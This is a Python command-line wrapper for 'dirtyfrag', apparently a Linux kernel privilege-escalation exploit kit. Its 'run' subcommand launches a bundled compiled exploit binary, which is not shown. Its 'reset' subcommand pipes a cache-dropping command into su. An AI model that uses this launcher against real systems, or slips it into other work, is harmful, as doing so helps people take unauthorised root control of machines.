import os
import sys
import argparse
import subprocess
from . import __about__ 

def get_binary_path():
    """Returns the absolute path of the compiled dirtyfrag C binary."""
    current_dir = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(current_dir, "bin", "dirtyfrag")

def execute_dirtyfrag(passthrough_args):
    """Executes the local native dirtyfrag C executable."""
    binary_path = get_binary_path()
    
    if not os.path.exists(binary_path):
        print(f"[-] Error: Compiled binary missing at {binary_path}", file=sys.stderr)
        sys.exit(1)
        
    if not os.access(binary_path, os.X_OK):
        os.chmod(binary_path, 0o755)
        
    print("[*] Initializing local exploit framework sequence...")
    try:
        # Pass all residual CLI arguments down to the C implementation
        result = subprocess.run([binary_path] + passthrough_args)
        sys.exit(result.returncode)
    except KeyboardInterrupt:
        print("\n[-] Operation aborted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Execution tracking error: {e}", file=sys.stderr)
        sys.exit(1)

def handle_run(args, passthrough_args):
    """Router for execution targets."""
    execute_dirtyfrag(passthrough_args)

def handle_reset():
    """Clears page cache, dentries, and inodes via /proc/sys/vm/drop_caches.
    
    Directly pipes instructions into an interactive 'su' session 
    with zero fallback mechanisms or pre-checks.
    """
    print("[*] Shifting target sequence to interactive root shell...")
    try:
        proc = subprocess.Popen(
            ["su"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        commands = (
            "echo 3 > /proc/sys/vm/drop_caches\n"
            "exit\n"
        )
        
        proc.communicate(input=commands)
        
        if proc.returncode == 0:
            print("[+] Kernel caches dropped successfully via subverted su pipeline.")
        else:
            print("[-] Error: Direct system cache execution failed.", file=sys.stderr)
            sys.exit(1)
            
    except Exception:
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="Unified Interface for Kernel Privilege Escalation Vulnerability Engineering Assets"
    )
    parser.add_argument("-v", "--version", action="version", version=f"%(prog)s {__about__.__version__}")
    
    subparsers = parser.add_subparsers(dest="command", required=True, help="Subcommand to execute")
    
    # 'run' subcommand 
    subparsers.add_parser("run", help="Initiate exploit chain orchestration")
    
    # 'reset' subcommand
    subparsers.add_parser("reset", help="Clear kernel system cache (drop_caches)")
    
    args, passthrough_args = parser.parse_known_args()
    
    if args.command == "run":
        handle_run(args, passthrough_args)
    elif args.command == "reset":
        handle_reset()

if __name__ == "__main__":
    main()
